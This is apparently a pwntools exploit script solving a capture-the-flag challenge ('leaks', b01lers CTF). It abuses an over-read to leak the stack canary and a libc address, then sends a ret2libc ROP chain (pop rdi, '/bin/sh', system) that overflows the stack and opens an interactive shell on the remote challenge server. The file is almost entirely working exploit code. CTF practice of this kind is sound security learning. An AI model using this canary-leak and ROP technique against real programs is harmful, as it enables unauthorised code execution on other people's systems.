#!/usr/bin/env python3

from pwn import *

exe = ELF("./leaks-c85e4a348b2a07ba8e6484d69956d968")
libc = ELF("./leaks-libc")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
        return process(env={"LD_PRELOAD": libc.path})

def send_name(r, name):
    r.recvline()
    r.sendline(str(len(name) - 1))
    r.send(name)

def send_to_leak(r, leak):
    r.sendline(str(len(leak) - 1))
    r.send(leak)


def main():
    #r = conn()
    r = remote("chal.ctf.b01lers.com", 1009)

    
    send_name(r, b"MAHER")

    #Canary leak.
    send_to_leak(r, b"M"*(8*3 + 1))
    r.recvuntil(b"M"*(8*3))
    CANARY = u64(r.recv(8)) >> 8 << 8
    log.warn("Canary leak @ 0x%x", CANARY)
    r.recvline()

    #Libc leak
    send_to_leak(r, b"M"*(8 * 5))
    r.recvuntil(b"M"*(8*5))
    LIBC_LEAK = u64(r.recv(6) + b"\x00"*2)
    log.warn("glibC Leak @ 0x%x", LIBC_LEAK)
    r.recvline()

    #We got all things we need! shoot!
    libc.address = LIBC_LEAK - libc.sym['__libc_start_main'] - 243
    log.warn("glibc base @ 0x%x", libc.address)

    payload  = b"M"*(8*3)
    payload += p64(CANARY)  
    payload += p64(0)       #rbp
    payload += p64(libc.address + 0x0000000000026b72) #PopRdi
    payload += p64(next(libc.search(b"/bin/sh")))
    payload += p64(libc.address + 0x26b73)
    payload += p64(libc.sym['system'])
    
    pause()
    send_to_leak(r, payload)




    r.interactive()


if __name__ == "__main__":
    main()
